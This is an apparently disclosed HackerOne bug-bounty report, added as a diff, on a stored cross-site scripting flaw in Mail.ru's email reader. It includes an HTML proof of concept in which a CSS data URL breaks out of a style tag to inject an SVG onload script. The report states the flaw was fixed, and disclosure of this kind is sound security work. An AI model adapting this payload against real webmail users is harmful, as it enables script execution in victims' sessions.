@@ -1,0 +1,37 @@
+ReportLink:https://hackerone.com/reports/274844
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/ras-it
+ReportedTo:Mail.ru(mailru)
+BountyAmount:1000.0
+Severity:high
+State:Closed
+DateOfDisclosure:13.03.2018 13:17:40
+
+Summary:
+XSS via crafted block style.
+
+Demonstrated attack vector was eliminated on the date of reporintg, final solution changes parsing algorythm to eliminate similar attacks.
+Hello team,
+I have found stored XSS when you read emails via <style> html tag.
+
+__PoC:__
+```
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div  {
+    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+    background-color: #cccccc;
+}
+</style>
+</head>
+<body>
+
+<div>lol</div>
+
+</body>
+</html>
+```
+{F226715}
+
